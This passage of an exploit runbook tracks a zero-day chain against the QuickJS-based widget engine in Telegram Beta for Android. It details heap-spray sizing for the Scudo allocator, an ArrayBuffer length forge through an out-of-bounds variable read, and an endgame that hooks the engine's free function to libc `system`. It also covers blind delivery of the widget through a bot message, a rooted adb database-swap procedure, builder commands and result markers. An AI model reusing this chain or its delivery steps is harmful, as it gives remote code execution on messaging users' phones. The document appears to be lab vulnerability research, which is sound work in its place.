alive. The final is `c2560_final_c2560h_72889.html`; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`. No Frida/per-device.

---

## 0a-quater. SUPERSEDING UPDATE 4: forged pivot + non-fatal slab (NOBASE fix)


Device c2560d debug: `S1 ABLEN[599]=327744 VLEN=327744 END=HF ERR NOBASE`.
The endgame's pivot picked a live class-64 AB -> D2 = that AB's data, and the
`D2-8` header/arena/slab chain gave an invalid `slabBase`. The forged AB's
own struct has byte_length 327744 and data = the V base; using it as the
pivot makes the arena/slab chain come from the **live T[599] data block**.
endG4 (`device/endG4.js`): (1) prefers the forged AB as the pivot; (2) never
throws on BADBS/NOSLAB/NOBASE; it sets `globalThis.SLABV` with
`H/D/BS/SLAB/SBASE` and continues with the direct forged-view candidates
(`inSlab` falls back to pointer validation). The debug C now prints
`S1 <mark> END=<MEGA> SV=<SLABV>`; on the host the slab path succeeds and
`SV=` is empty.

The forced direct-only path (slab off) crashes the host widget heap, so the
slab path is kept when available; the fallback is only for the NOBASE case.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_c2560g_72889.html` | 8,120 | 3,306 |
| `c2560_final_c2560g_72889.html` | 8,120 | 3,306 |
| `c4096_debug_c4096g_72889.html` | 8,395 | 3,308 |
| `c4096_final_c4096g_72889.html` | 8,395 | 3,308 |
| safe probes | 8,120 / 8,395 | 991 / 995 |

Host: c2560g final 5/5 proof 162, debug 5/5 `END=HF OK`; c4096g final 5/5
proof 162, debug 5/5 `END=HF OK`. A/B/C: c2560 A=2,228, c4096 A=2,503,
B=5,356 (device; +399 vs the 4,957 stage-A-proven build), C=408. The B grew
for the forged pivot/SLABV; the host stage A still forges. Blind path
`/tmp/opencode/tgbot/widget.html` = **c2560_debug_c2560g_72889.html**.

**Next device run: c2560 debug.** Expected stage C:
`S1 ABLEN[599]=327744 VLEN=327744 END=HF OK SV=` if the forged pivot fixes
the slab; or `END=HF ERR <code> SV=<SLABV>` with
`H=<bidx> D=<sidx> BS=<block_size> SLAB=<ptr> SBASE=<ptr>` if the slab chain
is still wrong. If the stage A marker is missing (NOCORR), the +399-byte B
shift moved the pre-A heap; then the B must be compacted back to 4,957. The
final is `c2560_final_c2560g_72889.html`; proof
`/data/user/0/org.telegram.messenger.beta/files/n1`. No Frida/per-device.

---

## 0a-ter. SUPERSEDING UPDATE 3: stage A proven on the Sony: endgame state channel


Device: c4096 probe AB(4080) PASS, c2560 probe AB(2544) PASS, c2560 debug
twin stage C `S1 ABLEN[599]=327744 VLEN=327744 ABLEN=327744 VLEN=327744` -
the cpool-110/AB(2544) class-2560 package **forges the 327,744-byte AB on the
device**, no Frida. The c2560 final stays alive but writes no proof: the
endgame fails silently. The c4096 final crashes in the endgame at
`0x17239d8` (a Uint8Array element read: length at `[x1+0x40]`, data pointer
`[x1+0x38]`; a false endgame window at `0x6c380314d0`, index 0x118, in a
4 KB PROT_NONE guard), not at the stage-A forge.

**Endgame state channel.** endG3/endG2 no longer throw at the end; they set
`globalThis.MEGA="HF "+S` (the B length is padded back to the proven
4,957/4,941 bytes, so the c2560 stage-A heap is unchanged). The debug stage C
now prints `S1 <mark> END=<MEGA>`; the final stage C is the same-length no-op.
The old `throw` is replaced, so the final's proof is written at teardown.

| widget | raw | zlib9 |
|---|---:|---:|
| `c2560_debug_2560d_72889.html` | 7,721 | 3,163 |
| `c2560_final_2560d_72889.html` | 7,721 | 3,163 |
| `c4096_debug_4096d_72889.html` | 7,996 | 3,163 |
| `c4096_final_4096d_72889.html` | 7,996 | 3,163 |
| safe probes `_2560d_`/`_4096d_` | 7,721 / 7,996 | 966 / 972 |

A/B/C keep 2,228 (c2560) / 2,503 (c4096), 4,957, 408. Blind path
`/tmp/opencode/tgbot/widget.html` = **c2560_debug_2560d_72889.html**.

**Next device run: the c2560 debug.** Expected stage C:
`S1 ABLEN[599]=327744 VLEN=327744 END=HF ERR <code>` (or `END=HF OK` if the
anchor now resolves). The `<code>` localises the failure:
`NOV/NOVS/NOABX` stage A/V; `NOOBJ` class-20 candidates; `NOCTOR/NOREALM/
NORT` proto/ctor/realm/rt; `NOFREE/NOANCHOR/BADPIE/NOGOT/NOELF/NOSYS` the
libc/ELF anchor. If the debug crashes instead, the false endgame window (the
c4096 `0x17239d8` class) is the issue; the c2560 final is not run until the
debug shows a state. Then the c2560 final; the proof path
`/data/user/0/org.telegram.messenger.beta/files/n1`.

The endG2 direct-scan variant was rebuilt (4922/4906 min, padded to
4,957/4,941) and host-tested with the c2560 stage A: it **crashes 5/5** in
the host widget heap, so it is not a usable fallback. The endG3+MEGA is the
host-proven endgame (final 5/5 proof 162, debug 5/5 `END=HF OK`, probes
survive).

---

## 0a-bis. SUPERSEDING UPDATE 2: +8 headroom rule and corrected AB sizes


The first c4096 probe crashed on the Sony (`0x174d9ac`, fault
`0x6e5e981dc8`, PROT_NONE target page). Root cause (N1
`REPORT_scudo_classmap.md`): `ArrayBuffer(len)` requests `8+len`; AB(4096)
→ 4104 → class 4352, a different tag than b (class 4096), so the 4096 target
region was never filled. Fix: `AB(4080)` → 4088 → class 4096;
`AB(2544)` → 2552 → class 2560. The tag b4 matches; the fault was the
uncommitted page, not MTE.

**Corrected packages (use these; the old AB(4096)/AB(2560) widgets are
deprecated):**

| widget | raw | zlib9 |
|---|---:|---:|
| `c4096_probe_4096c_72889.html` | 7,996 | 970 |
| `c4096_final_4096c_72889.html` | 7,996 | 3,184 |
| `c4096_debug_4096c_72889.html` | 7,996 | 3,184 |
| `c2560_probe_2560c_72889.html` | 7,721 | 964 |
| `c2560_final_2560c_72889.html` | 7,721 | 3,185 |
| `c2560_debug_2560c_72889.html` | 7,721 | 3,186 |

Blind path `/tmp/opencode/tgbot/widget.html` = corrected c4096 probe.
Device order: c4096 probe (AB(4080)); expect `PRB M=SAFE4096C A=-1`; then
c4096 final (expect `ABLEN[599]=327744`, `HF OK`, n1 proof). If the 4096
probe still faults, run c2560 probe (AB(2544)); expect `PRB M=SAFE2560C
A=-1`; then the c2560 final. Next class if both fail: 3072 (cpool ~145
floats, AB(3056), delta 427); then 2048 (delta 640). If all classes fault
PROT_NONE, the class ladder is exhausted; fix the allocation order/region
mapping instead.

---

## 0a. SUPERSEDING UPDATE (2026-11-08): generic Scudo map + cpool 4096


**Use this, not the 0x450/1,104 model below.** The device's Frida usables
(889/1988) and the measured class ladder follow the **generic Android Scudo
map** (`…896, 1024, 1280, 1792, 2048, 2560, 3072, 4096…`), not the
`AndroidSizeClassMap` 0x450/0x670/0x830 list. The 881/889 b is class **896**;
the 1,980 filler is class **2048**: the 3,200×896 spray hits the class-896
ceiling (F≈2,550, cover≈3,265; 3,200 misses, 3,600 OOMs; two-wave NOCORR).

The `arg_count` ladder is dead: named/extra parameters suppress the leak
(`ACV scope_idx=31/63/127`, no 65,534). Local variables keep the leak but
grow varc/closure count (N=128 → count=132, class 4096), losing the class-64
T[599] loot.

**Winner: cpool shift with the single `[] = eval("[]")` parameter.** 180
float literals → `fsize=3731`, class **4096**, varc=6/count=7 (T[599] loot
intact), target delta 320.7 chunks, phase 2,988. Spray **700×AB(4096) =
2.87 MB** (class-matched, same tag), within the 8 MB engine baseline.
Host-proven: stage A `ABLEN[599]=327744` 5/5, full endgame 5/5 `HF OK` +
162-B proof, all-4 safe probe 5/5 `SAFE4096`.

| widget | raw | zlib9 |
|---|---:|---:|
| `device/widget/c4096_probe_72889.html` | 7,996 | 979 |
| `device/widget/c4096_final_72889.html` | 7,996 | 3,183 |
| `device/widget/c4096_debug_72889.html` | 7,996 | 3,184 |

A/B/C lengths identical (A=2,503, B=4,957, C=408; the all-4 probe A padded
to 2,503). Blind path `/tmp/opencode/tgbot/widget.html` = the probe.

Device order: **c4096_probe** first; expect `PRB M=SAFE4096 A=-1` and
survival; then **c4096_final**: expect `RESULT ABLEN[599]=327744`,
`HF OK`, n1 proof after teardown. If the 4096 probe faults, fall back to
class 2560 (cpool ≈130 floats, AB(2560) ≈1,100 chunks) and repeat. No
Frida, no `chain_off`.

---

## 0. Device-driven Scudo containment (superseded by §0a)



The Sony run has moved past the eval/atom unknowns:

* `probe_881safe` survives with `DIR=direct` and `CHG=0`; the 881 class is
  tag-compatible and the direct-eval 0day fires from widget JS.
* `A_univ881big` (3,200×AB(881)) gives stage C `M=NOCORR AB=-1`; the app is
  alive. The earlier 1,800×881 run died at `add_closure_variables`
  (`0x174d9ac`, `vd->scope_level` load) because the target page was in a
  Scudo `PROT_NONE` reservation.

**Correct class map (AOSP android13-release):** b's 889-B request and
AB(881)/AB(1,096)/AB(1,104) are all class **0x450 = 1,104 B**.
AB(1,980) is class **0x830 = 2,096 B**: a different region; the old
1,980-B/1988 calibration does **not** apply and must not be run.

**Target math:** target = `b->vardefs + 1,310,700` = `b + 1,311,308`.
With b mod 1,104 = 472: **1,188 chunks + 228 B**: the 881-B data covers the
target phase (228). The miss is chunk allocation, not the buffer phase.

**Fit of the device points:** the 0x450 class free list holds ~**2,700**
pre-existing chunks (other regions) before the spray. The 1,800 spray is less
than F → no new increment (PROT_NONE). At 3,200: `F + 475 = 3,175` maps the
target page, but `F + 581 = 3,281` (LIFO) / `3,305` (FIFO) is needed to pop
the target chunk → NOCORR by ~81-105 chunks. Model:
`device/scudo_model.py --fit`; analysis: `device/SCUDO_CONTAINMENT_ANALYSIS.md`.

**Next device probe: `device/widget/canary_n1c_probe_3400_72889.html`**
(7,815 raw / 1,062 zlib9). Same stage-A order/sizes as `A_univ881big`
(keep=3,000 symbols, PB/UV fill, 3,400×AB(881), D=3,000, T=600) plus a
paired class-64 canary array C (1,200; free evens). Stage B is a no-op padded
to the endgame length; stage C renders
`PRB H=<hit> N=<attempts> S=881 T=- C=<canary>`. The probe/final/debug share
A=2,322, B=4,957, C=408 (pre-A heap identical).

Interpretation:

| marker | meaning | next |
|---|---|---|
| `PRB H=CANARY[i]=327744` | target chunk contained + paired adjacency OK | run `canary_n1c_final_3400_72889.html` (7,815 / 3,215); expect `HF OK` + n1 proof |
| `PRB H=NOCORR N=10` | containment still short (F>2,725) or F=2 missing | 3,600/3,800, or drain-keep-tail (§SCUDO note) |
| crash in stage A | target page PROT_NONE (F>2,725) | 3,600+; collect `/proc/pid/maps` + b |
| `PRB H=ABLEN[599]` | T[599] adjacency also works | run the final |

The all-4 `probe_881safe` cannot detect containment (F=1 lands on the victim
header, `CHG=0`); the JUMP/TERM paired canary is the positive signal. The
blind path `/tmp/opencode/tgbot/widget.html` currently contains the 3,400
probe. Host validation: 3,400/3,600 host twins 3/3 probe+final; the exact
device 3,400 probe runs on host (`NOCORR` on the host heap, expected); the
3,600 host twin hits `CANARY[1171]` + `HF OK` + proof.

Memory: 3,200 is device-proven to fit; 3,600+C with a 3.1 MiB bundle OOMs in
the host model, so 3,400 is the smallest margin-safe spray. If OOM, drop D
(not needed with the paired canary) or use the drain-keep-tail variant.

---

## A. Universal blind final (0day-only): USE THIS

> **Superseded by UPDATE 18/19 (c2560s):** this §A block documents the
> historical 881-byte `univ_*` package. The current universal deliverable is
> the c2560s family, built by `device/gen_c2560s.py` (§A.7).

### A.1 Artifacts and sizes

Generated by `device/gen_universal_a.py` (stage A) +
`device/endG3.js`→minified (stage B) + `device/gen_sibling_widgets.py` helpers
(HTML / stage C). Sizes are raw / zlib9, all within 32,768 / 4,096:

| widget | raw | zlib9 | stage B | purpose |
|---|---:|---:|---|---|
| `device/widget/univ_final_72889.html` | 7,282 | 3,125 | `endG3_dev.min.js` (device constants, 50-B command) | **blind device final** |
| `device/widget/univ_debug_72889.html` | 7,282 | 3,126 | `endG3_dev.min.js` | same + stage C reports `S1 ...` |
| `device/widget/univ_final_host.html` | 7,266 | 3,111 | `endG3_host.min.js` (host constants) | host validation only |
| `device/widget/univ_debug_host.html` | 7,266 | 3,111 | `endG3_host.min.js` | host validation only |

The blind send path is `/tmp/opencode/tgbot/widget.html` (the running
<BOT_USERNAME> instance serves this file): it currently contains the exact bytes of
`univ_final_72889.html`. Re-copy with
`cp device/widget/univ_final_72889.html /tmp/opencode/tgbot/widget.html`
after any regeneration.

Known-build constants in the device endgame (allowed, not per-device unknown
values): `JS_DEF_FREE=0x174b26c`, `FREE_GOT=0x1971ef0`, `CALIGN=4`; the
50-byte command is
`id>/data/data/org.telegram.messenger.beta/files/n1`.
Everything else (heap/realm/rt/PIE/ELF) is resolved at runtime from memory by
stage B.

### A.2 Stage A (universal blind)

Stage A is a plain sibling `<script>` (the engine's `kC` whitelist collects
it; it is evaluated as its own `JS_Eval(GLOBAL)`). It:

1. defines
   `function f([] = eval("[]")) { var q1=0,q2=0,q3=0; return <30×1.5>; }`
   (argc=1, var_count=6, cvc=0, fsize=881 on the host build; the vulnerable
   `JSFunctionBytecode` allocation is the same 881-byte size class);
2. grows the atom table with 65,600 `Symbol()` values, keeps the last 3,000
   (`SY.slice(65600-3000)`), and drops the array. The array stays large
   (`atom_size` grows 711→…→92,170) and atom **slot 65535** is live. This is
   required because shifted fake-vardef reads can use the JUMP record's
   `scope_next` word 65535 as a `var_name`; `JS_DupAtom(65535)` must resolve
   to a live atom. The 3,000 kept symbols keep that window alive while
   releasing the rest of the heap;
3. allocates **1800 × `ArrayBuffer(881)`** (the fake-vardef fillers),
   **2500 × `ArrayBuffer(64)`** (drain) and **600 × `ArrayBuffer(64)`**
   (targets), then frees `T[598]` (`T[tn-2]=null`). The freed 56-byte
   `JSArrayBuffer` struct is reused by the closure_var allocation, making
   `T[599]` the next 64-byte block;
4. fills each 881-byte filler with a periodic 40-byte pattern of two 20-byte
   fake `JSVarDef` records:
   * JUMP: `var_name=4, scope_level=5, scope_next=65535, flags=0x04, func=4`
   * TERM: `var_name=4, scope_level=5, scope_next=4,     flags=0x04, func=4`
   with both parities (JUMP first / TERM first);
5. sweeps 5 phases (`ph=0,4,8,12,16`) × 2 parities and calls `f()` after
   each fill, stopping at the first `T[i].byteLength > 1024`. It then exposes
   `globalThis.V` (Uint8Array over the forged AB), `globalThis.VAB`,
   `globalThis.T`, and throws `RESULT ABLEN[599]=327744 VLEN=327744`.

**Why it is blind.** `add_closure_variables` reads
`b->vardefs[b->arg_count + 65534]` = `b->vardefs + 65535*20` = **+1,310,700
bytes**, an offset fixed by the leaked scope index for every build. The 1800
same-size fillers form a controlled run longer than 1.31 MB after the
vulnerable bytecode; the phase/parity sweep places a JUMP record exactly at
the (unknown) filler offset. The JUMP `next=65535` lands one vardef later
(`target+20`), inside the same 40-byte pattern pair, where the TERM record
ends the scope chain after adding the second fake entry. (The older +180-byte
JUMP variant was replaced: it could read past the end of the 881-byte buffer
when the target sat near its end.)

**Overflow arithmetic.** `count = argc+varc+cvc = 7` → the closure_var array
is 7×8 = 56 bytes, class 64. The two fake entries plus the real entries
(1 arg + 6 locals = 7) give 9 entries. Entry 8 (the last local, `var_idx=5`,
`var_kind=2` ⇒ flags byte 0x40) starts at byte 64, exactly the next 64-byte
arena block: the adjacent `JSArrayBuffer` struct. Its `byte_length` becomes
`0x00050040 = 327,744`; `max_byte_length` becomes the duplicated atom.

**Shifted-read safety.** The pattern words are only 4, 5 and 65535. The flags
byte 0x04 at record offset 12 sets `is_captured` (bit 2) with `var_kind=0`,
and the `var_ref_idx` bytes at offsets 14-15 are zero; any shifted read that
reaches `js_closure2`/`get_var_ref` therefore resolves to
`sf->var_refs[0]` instead of allocating a var ref for an OOB index. All
non-aligned windows have `scope_level` 4 or 5 (>0) and `scope_next` 4 or
65535; `scope_next=4` lands in real level-0 vardefs and terminates, and
`scope_next=65535` is the aligned JUMP.

### A.3 Stage B (generic 0day-only endgame)

`device/endG3.js` (minified per variant; source is the single source of
truth). It:

* requires `V.length == 327744`, finds the pivot class-64 `JSArrayBuffer`
  struct with `byte_length=64` and restores its real data pointer after every
  window view (so later frees stay valid);
* validates every dereferenced pointer against mapped 64 KiB arena slab
  ranges, scans class-20 candidates from class-112 arenas, validates the
  C_FUNCTION code pointer, and requires `rt+0x38` (malloc_limit) ∈
  {0x800000, 0x600000, 0x400000};
* resolves the realm/prototype/constructor, `JSRuntime`, the ELF base and
  `system` from the dynamic symbol table (`hash` or `gnu`), then sets
  `rt->mf.js_free = system` and `malloc_state.opaque = D2`, where `D2` holds
  the NUL-terminated 50-byte command.

No n-day stage is used; nothing outside the generic shape/proto/ctor/realm/rt
and ELF/Mach-O walk is present. The object-code path is AArch64 on the device
(`CALIGN=4`); the host twin uses `CALIGN=1`.

### A.4 Host validation (exact widget scripts, 5/5)

`run_sib_plain` models the app engine: it parses the HTML, collects every
whitelisted `<script>`, and evaluates each as a separate `JS_Eval(GLOBAL)` in
document order, installing `document.getElementById` and `console.log`.
Limit 8 MiB (the app's limit; the app-like shims add document/console).

| test | result |
|---|---|
| `univ_final_host.html`, 5 runs | **5/5** `RESULT ABLEN[599]=327744 VLEN=327744` + `HF OK`; proof `/tmp/hf_proof` 162 B (`uid=...` + `HF`) |
| `univ_debug_host.html`, 5 runs | **5/5** `HF OK` + `S1 ABLEN[599]=327744 VLEN=327744 ...` |
| all 10 sweep attempts with the hit check disabled (`NCALL=10`), 8 MiB and 5 MiB, 3+3 runs | no crash (rc=2 uncaught `RESULT NOCORR` only); every phase/parity is safe |
| memory floor (host, `run_plain` binary search) | success at **4.27 MiB**, OOM at 4.26 MiB; works at 4.3/5/6/7/8 MiB |
| full chain at a **5 MiB** runtime limit (test-only endgame variant accepting 0x500000) | **5/5** `RESULT ABLEN[599]=327744 VLEN=327744` + `HF OK` + 162-B proof; the whole stage A+B fits the device's ~5.2 MB budget |
| exact stage A/B under a synthetic **~3.1 MB bundle-boot preload** (3000×~1 KB live strings + 2000 props, evaluated before stage A) at 8 MiB | **5/5** `RESULT ABLEN[599]=327744 VLEN=327744` + `HF OK` + 162-B proof (`device/widget/univ_boot_host.html`) |
| CPU (host, median of 3) | ~286-300 ms for the full sweep; stage A dominates (65,600 `Symbol()`), stage B is small |

Device budget: the app heap limit is 8,388,608 B (0x800000); the bundle
boot/DOM/script live set is ~3.19 MB, leaving ~5.2 MB for stage A. The
measured stage-A peak is 4.27 MiB, so the host budget margin is ~0.9 MB.
On Android the 881-byte `AB` data and `b` share a Scudo size class, so the
+1.31 MB target should land in a controlled filler with higher probability
than on host glibc (which interleaves small chunks).

Note on the proof: stage B installs the hook and throws `HF OK`; the command
itself runs at runtime teardown, when the patched `mf.js_free` is called. On
the host the harness calls `JS_FreeRuntime` at exit (proof 162 B). On device,
close/reopen the widget (or wait for the engine/runtime teardown) and then
pull the file. The debug widget's stage-C allocations can perturb the host
teardown free order (an occasional empty proof); use the **final** widget for
the proof.

### A.5 Device procedure (blind, no Frida)

1. Confirm `/tmp/opencode/tgbot/widget.html` is the current
   `univ_final_72889.html` (7,282 raw / 3,125 zlib9).
2. Send it through <BOT_USERNAME> inline (preferred) or as a normal widget message.
   No Frida attach, no calibration, no per-device constants.
3. Open the widget in Telegram Beta 72889 on the Sony XQ-BT52 (Android 13).
   - Stage A runs first; logcat shows the `RESULT ABLEN[599]=327744
     VLEN=327744` error/console line.
   - Stage B runs next; logcat shows `HF OK` (or `HF ERR <code>`).
4. Close/reopen the widget to trigger runtime teardown, then pull the proof:
   ```
   adb -s <SERIAL> shell "su -c 'cat /data/user/0/org.telegram.messenger.beta/files/n1'"
   ```
   Expected: the `uid=10346(...)` line from `id`. A crash after `HF OK` is
   expected (every free re-runs the command).
5. If stage A reports `NOCORR` (no forge) or stage B reports `NOV`, do not
   retry blindly: the +1.31 MB target was not inside a controlled 881-byte
   filler in this heap. Fall back to §B diagnostics (calibrated intermediate)
   to measure the actual record offset / filler containment on this build.

DB deploy fallback (only if inline sending is unavailable): the established
mid-80345/uid-<CHAT_ID> procedure in §B.5 works unchanged with
`WIDGET=device/widget/univ_final_72889.html`; then open the message and follow
step 4. Remove the stale proof first (`rm -f .../files/n1`).

### A.6 Markers and failure map (universal)

| marker | meaning |
|---|---|
| stage A `RESULT ABLEN[599]=327744 VLEN=327744` | forged AB; stage A sweep hit |
| stage A `RESULT NOCORR` | safe miss: the target was not in a controlled filler at any phase; nothing was forged (no crash) |
| stage B `HF OK` | anchors + `system` resolved and the free hook installed |
| proof `n1` contains `uid=10346(...)` | `system(cmd)` ran (after teardown) |
| crash after stage B | expected (the patched free reruns the command) |
| `HF ERR NOV` / `NOVS` / `NOABX` | stage A did not forge or `V/VAB/T` are missing/wrong length |
| `HF ERR NOOBJ/NOCTOR/NOREALM/NORT/NOFREE/NOANCHOR` | endgame anchor walk failed under this heap/allocator |
| `HF ERR BADPIE/NOGOT/NOELF/NOSYS` | wrong app build / lib offsets, or the ELF resolver failed |
| SIGSEGV in stage A before any result | the +1.31 MB target was outside the fillers and contained hostile data; recreate the widget from the generator (do not edit the stage-A source) and retry once; otherwise use §B to calibrate |

All stage-A/B results are thrown exceptions; the engine continues to the next
script. A `NOCORR` is a clean diagnostic, not a device crash.

### A.7 Regeneration

**SUPERSEDED (2026-11-07): use the canonical c2560s builder, not this recipe.**
This §A/§A.7 block regenerates the OLD 881-byte `univ_*` package (endG3,
`gen_universal_a.py`); the current universal deliverable is the c2560s family
(UPDATE 16-19, B=7,182). The canonical builder reproduces the shipped
`c2560_{final,debug,probe}_c2560s_{72929,host}.html` byte-exactly from in-tree
sources and pins the shipped SHA-256s (the device final is pinned to
`992a51267a385c57635f5aed835aa29a1006ca8c584ca3843b265cd2c71318b4`):

```bash
cd lab/qjs_fork_audit/zeroday_hunt_parser
python3 device/gen_c2560s.py                 # build+verify the 6 canonical widgets
python3 device/gen_c2560s.py --no-write      # dry run
python3 device/gen_c2560s.py --check-c2      # + re-verify the c2 variants
```

Key facts (see the builder docstring for the full pin table):
* stage B source of truth = `device/endG8s.js`; substitutions DBG (0 final /
  1 debug), CALIGN (4 device / 1 host), CMD (50-B device / 39-B host,
  **inlined at the usage site**: a `var CMD` literal gets hoisted by terser
  and drifts);
* minification = `terser -c passes=2 -m` (**passes=2 is required**: the
  default single pass gives 7,212 B, passes=2 gives the shipped 7,182 B;
  identical output on terser 5.16/5.24/5.31/5.38), then pad to B=7,182 with
  a trailing `/*P...*/` comment;
* the host debug twin was stale (B=6,897, harness segfault) and was
  regenerated by the builder at B=7,182 (host harness `END=HF READY` 3/3).

The `endG3_dev.min.js` / `endG3_host.min.js` note below remains historical
(the 881-era package; not the current deliverable).

---

## B. `device_calibrated_intermediate` (diagnostic only)

**Status: intermediate, not for final delivery.** These widgets use a
pre-measured `chain_off` (record start inside the filler) and therefore a
one-time Frida calibration. They are kept as a diagnostic fallback for the
case where §A reports `NOCORR` and the actual record offset/containment must
be measured on the device build.

### B.1 Artifacts

`device/widget/parser_{trigger,calib,final,debug}_72889.html` (14,287 raw /
≤2,953 zlib9) + `*_host.html` twins. Generator:
`device/gen_sibling_widgets.py --chain-off <off> --tag 72889`. The package
uses the proven `n1_hookfree` stage A `A_ab.js` (1000 × 1980-byte buffers,
records at `chain_off`) and stage B `endG_dev.min.js`; it is **not** 0day-only
in the sense of §A only in that it carries the calibration constant; the
entrypoint is still the parser 0day and no n-day stage is used.

### B.2 Calibration (one time, Frida)

1. Attach `device/frida_calib.js` to the app before opening the widget:
   `frida -U -n "Telegram Beta" -l device/frida_calib.js`.
   It hooks libc `calloc` and looks for `calloc(1,889)` (the vulnerable
   `JSFunctionBytecode`) and `calloc(1,1988)` (the 1,980-byte fake-record
   buffers), validating the bytecode signature
   (`byte_code_len=133, argc=1, var_count=6, cvc=0, cpool=30`).
2. Send `parser_calib_72889.html`. The hook prints
   `CALIB {"b":...,"target":...,"base":...,"off":668,"prefix":8,"chain_off":660,"filler_index":647}`
   (the host value; device values come from the run). `target = b + 608 +
   20*(1+65534) = b + 1,311,308`; `prefix = off % 20`; `chain_off = off -
   prefix`. If no line appears, call `rpc.exports.heapscan()` in the Frida
   REPL.
3. Regenerate the intermediate package with the measured `--chain-off` and
   re-send `parser_trigger_72889.html`; stage C must report
   `ABLEN=327744 VLEN=327744`.

### B.3 Intermediate final/debug

`parser_final_72889.html` / `parser_debug_72889.html`: stage A forges the AB,
stage B (endG_dev) resolves the anchors and installs the free hook; the proof
is the same `n1` file after teardown. Host twins use `endG.min.js`. The
trigger/calibration widgets are identical in source length so the pre-A heap
is the same. This package is **only** a diagnostics fallback; do not deliver
it as the final.

### B.4 Host validation (intermediate)

| test | result |
|---|---|
| trigger-only host widget (`run_sib_plain`) | 5/5 `S1 ABLEN[599]=327744 VLEN=327744 RD@96 j=1 WROTE=true` |
| final host scripts at the engine boundary (`run_multi`) | 5/5 proof (`uid=...` + `HF`) |
| diagnostic calibration (`ACV OOB`) | host `buf=647 off=668` → prefix 8, record start 668 |

### B.5 DB deploy fallback (works for §A and §B)

```bash
LAB=<HOME>/ailocal/Telegram/telegramandroidwidget
DEV=$LAB/lab/qjs_fork_audit/zeroday_hunt_parser/device
BASE=/tmp/opencode/env_restore/final.db
WORK=/tmp/opencode/parser_work.db
SERIAL=<SERIAL>
WIDGET=$DEV/widget/univ_final_72889.html   # or parser_final_72889.html

cp "$BASE" "$WORK"
sqlite3 "$WORK" "DELETE FROM messages_v2 WHERE mid=80345"
python3 $LAB/lab/qjs_n1/db/build_db.py "$WORK" "$WIDGET"

adb -s $SERIAL push "$WORK" /sdcard/parser_install.db
adb -s $SERIAL shell "su -c 'cat /sdcard/parser_install.db > /data/user/0/org.telegram.messenger.beta/files/cache4.db \
  && rm -f /data/user/0/org.telegram.messenger.beta/files/cache4.db-wal \
           /data/user/0/org.telegram.messenger.beta/files/cache4.db-shm \
  && chown 10346:10346 /data/user/0/org.telegram.messenger.beta/files/cache4.db \
  && chmod 600 /data/user/0/org.telegram.messenger.beta/files/cache4.db \
  && chcon u:object_r:app_data_file:s0:c90,c257,c512,c768 /data/user/0/org.telegram.messenger.beta/files/cache4.db \
  && rm -f /data/user/0/org.telegram.messenger.beta/files/n1'"
adb -s $SERIAL shell am force-stop org.telegram.messenger.beta
adb -s $SERIAL shell am start -n org.telegram.messenger.beta/org.telegram.ui.LaunchActivity
sleep 8
# calibration only (B): attach frida BEFORE this open
adb -s $SERIAL shell "am start -n org.telegram.messenger.beta/org.telegram.ui.LaunchActivity \
  -a android.intent.action.VIEW -d 'tg://openmessage?user_id=<CHAT_ID>&message_id=80345'"
sleep 5
adb -s $SERIAL shell "su -c 'cat /data/user/0/org.telegram.messenger.beta/files/n1'"
```

No `run_mega_device.py` and no `setk` hook: the final run must not be
attached to Frida.

### B.6 Known-build constants (device intermediate)

The intermediate endgame uses the same known Telegram build constants as §A:
`JS_DEF_FREE=0x174b26c`, `FREE_GOT=0x1971ef0`, `CALIGN=4`, command
`id>/data/data/org.telegram.messenger.beta/files/n1` (50 B). The Frida
calibration is the only per-device measurement; `chain_off` is fixed by the
widget body + app build + allocator, not per launch.

### B.7 Artifacts (all)

```
device/
  widget/c2560_{final,debug,probe}_c2560s_{72929,host}.html   CURRENT universal deliverable; UPDATES 16-19
  widget/c2560_final_c2560s_c2_{72929,host}.html              C2 delivery variant (UPDATE 19)
  widget/c4096s_*.html            class-4096 fallback (host-only, not device-certified)
  gen_c2560s.py                   CANONICAL builder for the c2560s family (pinned SHA-256 asserts;
                                  stage A parametric + endG8s.js + terser -c passes=2 -m + pad B=7,182)
  widget/univ_{final,debug}_{72889,host}.html       universal blind (0day-only); §A (historical, superseded)
  widget/parser_{trigger,calib,final,debug}_{72889,host}.html  intermediate; §B
  gen_universal_a.py          universal stage A generator (no chain_off)
  gen_sibling_widgets.py      sibling widget assembler (chain_off/calib; --device/--host)
  endG3.js                    generic 0day-only endgame source (host/device variants)
  endG3_dev.min.js / endG3_host.min.js
  endG8s.js                   current endgame source of truth (DBG/CALIGN/CMD substituted by gen_c2560s.py)
  endG2.js                    experimental class-20 fallback (NOT in the package)
  frida_calib.js              one-time calibration hook (intermediate only)
  harness_siblings.c          app-like sibling-script harness (document/console shims)
  harness_widget.c            (0,eval)/text-plain fallback harness
  RUNBOOK_hookfree_parser.md  this file
```
